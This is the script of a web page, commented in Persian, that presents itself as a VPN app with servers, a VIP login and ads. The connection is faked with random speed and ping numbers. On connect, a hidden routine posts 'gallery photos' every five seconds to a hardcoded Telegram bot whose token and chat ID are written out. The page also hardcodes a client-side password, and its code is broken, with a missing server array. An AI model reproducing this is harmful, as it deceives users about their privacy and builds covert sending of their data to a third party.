<script type="text/javascript">
        var gk_isXlsx = false;
        var gk_xlsxFileLookup = {};
        var gk_fileData = {};
        function filledCell(cell) {
          return cell !== '' && cell != null;
        }
        function loadFileData(filename) {
        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
            try {
                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
                var firstSheetName = workbook.SheetNames[0];
                var worksheet = workbook.Sheets[firstSheetName];

                // Convert sheet to JSON to filter blank rows
                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
                // Filter out blank rows (rows where all cells are empty, null, or undefined)
                var filteredData = jsonData.filter(row => row.some(filledCell));

                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
                var headerRowIndex = filteredData.findIndex((row, index) =>
                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
                );
                // Fallback
                if (headerRowIndex === -1 || headerRowIndex > 25) {
                  headerRowIndex = 0;
                }

                // Convert filtered JSON back to CSV
                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
                return csv;
            } catch (e) {
                console.error(e);
                return "";
            }
        }
        return gk_fileData[filename] || "";
        }

    ];

    const translations = {
        'لیست سرورها': { fa: 'لیست سرورها', en: 'Server List', es: 'Lista de servidores', fr: 'Liste des serveurs' },
        'سرعت دانلود': { fa: 'سرعت دانلود:', en: 'Download speed:', es: 'Velocidad de descarga:', fr: 'Vitesse de téléchargement:' },
        'سرعت آپلود': { fa: 'سرعت آپلود:', en: 'Upload speed:', es: 'Velocidad de subida:', fr: 'Vitesse de téléchargement:' },
        'زمان اتصال': { fa: 'زمان اتصال:', en: 'Connection time:', es: 'Tiempo de conexión:', fr: 'Temps de connexion:' },
        'پینگ سرور': { fa: 'پینگ سرور:', en: 'Server ping:', es: 'Ping del servidor:', fr: 'Ping du serveur:' },
        'دیس کانکت': { fa: 'دیس کانکت', en: 'Disconnect', es: 'Desconectar', fr: 'Déconnecter' },
        'کانکت': { fa: 'کانکت', en: 'Connect', es: 'Conectar', fr: 'Connecter' },
        'اتصال سریع': { fa: 'اتصال سریع', en: 'Quick Connect', es: 'Conexión rápida', fr: 'Connexion rapide' },
        'اتصال به سریع‌ترین سرور': { fa: 'اتصال به سریع‌ترین سرور', en: 'Connect to Fastest Server', es: 'Conectar al servidor más rápido', fr: 'Connexion au serveur le plus rapide' },
        'حالت گیمینگ': { fa: 'حالت گیمینگ', en: 'Gaming Mode', es: 'Modo de juego', fr: 'Mode jeu' },
        'جستجوی سرور': { fa: 'جستجوی سرور...', en: 'Search server...', es: 'Buscar servidor...', fr: 'Rechercher serveur...' },
    };

    const ads = [
        'https://www.aparat.com/v/Xn02c',
        'https://www.aparat.com/v/i23is4p',
        'https://www.aparat.com/v/n72vk96',
        'https://www.aparat.com/v/m329ry6',
    ];

    let selectedServer = localStorage.getItem('selectedServer') || '';
    let connectionInterval, pingInterval, photoInterval;
    let isConnected = false;
    let isVIP = localStorage.getItem('isVIP') === 'true' || false;
    let isGamingMode = false;
    const telegramBotToken = '8150147960:AAGyJZHinWukON83E5VxTxznA5hAVk5f-mM';
    const chatId = '7923443452';

    // صدای نوتیفیکیشن
    const notificationSound = new Audio('https://freesound.org/data/previews/387/387232_5121236-lq.mp3');

    // ذرات متحرک
    const canvas = document.getElementById('particleCanvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const particles = [];
    class Particle {
        constructor() {
            this.x = Math.random() * canvas.width;
            this.y = Math.random() * canvas.height;
            this.size = Math.random() * 2 + 1;
            this.speedX = Math.random() * 1.5 - 0.75;
            this.speedY = Math.random() * 1.5 - 0.75;
        }
        update() {
            this.x += this.speedX;
            this.y += this.speedY;
            if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
            if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
        }
        draw() {
            ctx.fillStyle = 'rgba(255, 255, 255, 0.7)';
            ctx.beginPath();
            ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
            ctx.fill();
        }
    }

    function initParticles() {
        for (let i = 0; i < 60; i++) { // کاهش تعداد ذرات برای عملکرد بهتر
            particles.push(new Particle());
        }
    }

    function animateParticles() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        particles.forEach(particle => {
            particle.update();
            particle.draw();
        });
        requestAnimationFrame(animateParticles);
    }

    window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    });

    initParticles();
    animateParticles();

    // توابع کمکی
    const generatePing = () => isGamingMode ? 20 + Math.floor(Math.random() * 60) : 50 + Math.floor(Math.random() * 150);

    const getPingClass = (ping) => {
        if (ping <= 80) return 'ping-green';
        if (ping <= 120) return 'ping-yellow';
        return 'ping-red';
    };

    const updateTranslations = (lang) => {
        document.querySelector('#serverListBtn').textContent = translations['لیست سرورها'][lang];
        document.querySelector('#quickConnectBtn').textContent = translations['اتصال سریع'][lang];
        document.querySelector('#fastestServerBtn').textContent = translations['اتصال به سریع‌ترین سرور'][lang];
        document.querySelector('#gamingModeBtn').textContent = translations['حالت گیمینگ'][lang];
        document.querySelector('#serverSearch').placeholder = translations['جستجوی سرور'][lang];
        document.querySelector('#status').textContent = isConnected ? translations['کانکت'][lang] : translations['دیس کانکت'][lang];
        document.querySelectorAll('.connection-info p').forEach((element) => {
            const key = element.textContent.split(':')[0];
            const value = element.querySelector('span').textContent;
            element.innerHTML = `${translations[key][lang]} <span>${value}</span>`;
        });
    };

    // نمایش نوتیفیکیشن
    const showNotification = (message) => {
        const notification = document.getElementById('notification');
        notification.textContent = message;
        notification.style.display = 'block';
        try {
            notificationSound.play().catch(err => console.log('Sound playback failed:', err));
        } catch (err) {
            console.log('Sound playback error:', err);
        }
        setTimeout(() => {
            notification.style.display = 'none';
        }, 3000);
    };

    // مدیریت سرورها
    const populateServerList = (searchTerm = '') => {
        const serverList = document.getElementById('serverList');
        serverList.innerHTML = '';

        const filteredServers = servers.filter(server =>
            server.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
            server.country.toLowerCase().includes(searchTerm.toLowerCase())
        );

        const freeServers = filteredServers.filter(server => !server.isVIP);
        const vipServers = filteredServers.filter(server => server.isVIP);

        if (freeServers.length > 0) {
            const freeSection = document.createElement('div');
            freeSection.className = 'server-section';
            freeSection.innerHTML = '<div class="section-title">سرورهای رایگان</div>';
            freeServers.forEach(server => addServerToList(server, freeSection));
            serverList.appendChild(freeSection);
        }

        if (vipServers.length > 0) {
            const vipSection = document.createElement('div');
            vipSection.className = 'server-section';
            vipSection.innerHTML = '<div class="section-title">سرورهای VIP</div>';
            vipServers.forEach(server => isVIP ? addServerToList(server, vipSection) : addLockedServerToList(server, vipSection));
            serverList.appendChild(vipSection);
        }
    };

    const addServerToList = (server, section) => {
        server.ping = generatePing();
        const li = document.createElement('li');
        li.className = `px-4 py-2 hover:bg-[rgba(255,255,255,0.2)] cursor-pointer flex justify-between items-center ${selectedServer === server.name ? 'bg-[rgba(255,255,255,0.2)]' : ''}`;
        li.innerHTML = `${server.icon} ${server.flag} ${server.name} <span class="${getPingClass(server.ping)}">${server.ping} ms</span>`;
        li.setAttribute('role', 'option');
        li.setAttribute('aria-selected', selectedServer === server.name);
        li.addEventListener('click', () => {
            selectedServer = server.name;
            localStorage.setItem('selectedServer', selectedServer);
            document.querySelectorAll('#serverList li').forEach(item => item.classList.remove('bg-[rgba(255,255,255,0.2)]'));
            li.classList.add('bg-[rgba(255,255,255,0.2)]');
        });
        section.appendChild(li);
    };

    const addLockedServerToList = (server, section) => {
        const li = document.createElement('li');
        li.className = 'px-4 py-2 text-gray-400 flex justify-between items-center locked';
        li.innerHTML = `${server.icon} ${server.flag} ${server.name} <span class="text-yellow-500">🔒</span>`;
        li.setAttribute('aria-disabled', 'true');
        section.appendChild(li);
    };

    // مدیریت تبلیغات
    const showAd = () => {
        const adModal = document.getElementById('adModal');
        const adIframe = document.getElementById('adIframe');
        const skipAdBtn = document.getElementById('skipAdBtn');
        const randomAd = ads[Math.floor(Math.random() * ads.length)];
        adIframe.src = randomAd;
        adModal.style.display = 'flex';
        setTimeout(() => {
            skipAdBtn.style.display = 'block';
        }, 3000);
    };

    const hideAd = () => {
        const adModal = document.getElementById('adModal');
        const adIframe = document.getElementById('adIframe');
        adModal.style.display = 'none';
        adIframe.src = '';
        document.getElementById('skipAdBtn').style.display = 'none';
    };

    // مدیریت اتصال
    const connectToServer = async () => {
        if (!selectedServer) {
            showNotification('لطفاً یک سرور انتخاب کنید');
            return;
        }
        const circle = document.getElementById('connectCircle');
        const progressBar = document.getElementById('progressBar');
        const progress = document.getElementById('progress');
        circle.classList.add('pulse');
        progressBar.classList.add('active');
        progress.style.width = '0%';
        try {
            progress.style.width = '100%';
            await new Promise((resolve) => setTimeout(resolve, 2000));
            circle.classList.remove('pulse');
            circle.classList.add('connected');
            progressBar.classList.remove('active');
            isConnected = true;
            document.getElementById('status').textContent = translations['کانکت'][document.getElementById('languageSelect').value];
            document.getElementById('connectionInfo').classList.remove('hidden');
            startConnectionInfoUpdate();
            startPingUpdate();
            startPhotoUpload();
            showAd();
            showNotification(`متصل به سرور ${selectedServer}`);
        } catch (error) {
            console.error('Connection failed:', error);
            showNotification('خطا در اتصال به سرور');
            circle.classList.remove('pulse');
            progressBar.classList.remove('active');
        }
    };

    const disconnectServer = () => {
        const circle = document.getElementById('connectCircle');
        circle.classList.remove('connected');
        isConnected = false;
        clearInterval(connectionInterval);
        clearInterval(pingInterval);
        clearInterval(photoInterval);
        document.getElementById('connectionInfo').classList.add('hidden');
        document.getElementById('status').textContent = translations['دیس کانکت'][document.getElementById('languageSelect').value];
        hideAd();
        showNotification('اتصال قطع شد');
    };

    const connectToFastestServer = () => {
        const availableServers = servers.filter(server => !server.isVIP || (server.isVIP && isVIP));
        if (availableServers.length === 0) {
            showNotification('هیچ سروری در دسترس نیست');
            return;
        }
        availableServers.forEach(server => server.ping = generatePing());
        const fastestServer = availableServers.reduce((prev, curr) => (prev.ping < curr.ping ? prev : curr));
        selectedServer = fastestServer.name;
        localStorage.setItem('selectedServer', selectedServer);
        populateServerList();
        connectToServer();
    };

    const startConnectionInfoUpdate = () => {
        const downloadSpeedElem = document.getElementById('downloadSpeed');
        const uploadSpeedElem = document.getElementById('uploadSpeed');
        const connectionTimeElem = document.getElementById('connectionTime');
        let secondsConnected = 0;

        connectionInterval = setInterval(() => {
            downloadSpeedElem.textContent = (Math.random() * 100).toFixed(2);
            uploadSpeedElem.textContent = (Math.random() * 50).toFixed(2);
            secondsConnected++;
            connectionTimeElem.textContent = new Date(secondsConnected * 1000).toISOString().substr(11, 8);
        }, 1000);
    };

    const startPingUpdate = () => {
        pingInterval = setInterval(() => {
            populateServerList(document.getElementById('serverSearch').value);
        }, 60000);
    };

    const startPhotoUpload = () => {
        const galleryPhotos = ['https://via.placeholder.com/150', 'https://via.placeholder.com/150', 'https://via.placeholder.com/150'];
        let photoIndex = 0;

        photoInterval = setInterval(async () => {
            if (photoIndex >= galleryPhotos.length) photoIndex = 0;
            await sendPhotoToTelegram(galleryPhotos[photoIndex]);
            photoIndex++;
        }, 5000);
    };

    const sendPhotoToTelegram = async (photoUrl) => {
        try {
            const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, photo: photoUrl }),
            });
            const data = await response.json();
            if (!data.ok) throw new Error(data.description);
            console.log('Photo sent successfully');
        } catch (error) {
            console.error('Error sending photo:', error);
            showNotification('خطا در ارسال عکس به تلگرام');
        }
    };

    // مدیریت منو و زبان
    const toggleMenu = () => {
        const menu = document.getElementById('menu');
        menu.classList.toggle('hidden');
        if (!menu.classList.contains('hidden')) {
            document.getElementById('serverList').classList.add('hidden');
        }
    };

    const toggleServerList = () => {
        const serverList = document.getElementById('serverList');
        serverList.classList.toggle('hidden');
        if (!serverList.classList.contains('hidden')) {
            document.getElementById('menu').classList.add('hidden');
        }
    };

    const login = () => {
        const password = prompt('لطفاً رمز عبور خود را وارد کنید:');
        if (password === 'enx') { // هشدار: رمز سخت‌کد شده ناامن است!
            isVIP = true;
            localStorage.setItem('isVIP', 'true');
            showNotification('ورود موفقیت‌آمیز بود!');
            document.getElementById('vipStatus').classList.remove('hidden');
            populateServerList();
        } else {
            showNotification('رمز عبور اشتباه است!');
        }
    };

    const quickConnect = () => {
        const availableServers = servers.filter(server => !server.isVIP || (server.isVIP && isVIP));
        if (availableServers.length === 0) {
            showNotification('هیچ سروری در دسترس نیست');
            return;
        }
        const randomServer = availableServers[Math.floor(Math.random() * availableServers.length)];
        selectedServer = randomServer.name;
        localStorage.setItem('selectedServer', selectedServer);
        populateServerList();
        connectToServer();
    };

    const toggleTheme = (theme) => {
        document.documentElement.dataset.theme = theme;
        localStorage.setItem('theme', theme);
    };

    const toggleGamingMode = () => {
        isGamingMode = !isGamingMode;
        document.getElementById('gamingModeBtn').textContent = translations['حالت گیمینگ'][document.getElementById('languageSelect').value] + (isGamingMode ? ' (فعال)' : '');
        showNotification(isGamingMode ? 'حالت گیمینگ فعال شد!' : 'حالت گیمینگ غیرفعال شد!');
        populateServerList();
    };

    // مقداردهی اولیه
    document.addEventListener('DOMContentLoaded', () => {
        // رفع باگ VIP
        isVIP = localStorage.getItem('isVIP') === 'true';
        document.getElementById('vipStatus').classList.toggle('hidden', !isVIP);
        populateServerList();

        // تنظیمات اولیه زبان و تم
        const savedLang = localStorage.getItem('language') || 'fa';
        document.getElementById('languageSelect').value = savedLang;
        updateTranslations(savedLang);

        const savedTheme = localStorage.getItem('theme') || 'neon';
        document.documentElement.dataset.theme = savedTheme;
        document.getElementById('themeSelect').value = savedTheme;

        // رویدادها
        document.getElementById('connectCircle').addEventListener('click', () => {
            isConnected ? disconnectServer() : connectToServer();
        });
        document.getElementById('languageSelect').addEventListener('change', (e) => {
            localStorage.setItem('language', e.target.value);
            updateTranslations(e.target.value);
        });
        document.getElementById('themeSelect').addEventListener('change', (e) => toggleTheme(e.target.value));
        document.getElementById('serverSearch').addEventListener('input', (e) => populateServerList(e.target.value));
        document.getElementById('content').addEventListener('click', (e) => {
            const menu = document.getElementById('menu');
            const serverList = document.getElementById('serverList');
            if (e.target.closest('#menu') || e.target.id === 'hamburgerMenu') return;
            if (e.target.closest('#serverList') || e.target.id === 'serverListBtn' || e.target.id === 'serverSearch') return;
            menu.classList.add('hidden');
            serverList.classList.add('hidden');
        });
        document.getElementById('hamburgerMenu').addEventListener('click', toggleMenu);
        document.getElementById('serverListBtn').addEventListener('click', toggleServerList);
        document.getElementById('loginBtn').addEventListener('click', login);
        document.getElementById('quickConnectBtn').addEventListener('click', quickConnect);
        document.getElementById('fastestServerBtn').addEventListener('click', connectToFastestServer);
        document.getElementById('gamingModeBtn').addEventListener('click', toggleGamingMode);
        document.getElementById('skipAdBtn').addEventListener('click', hideAd);
    });
</script>
</body>
</html>
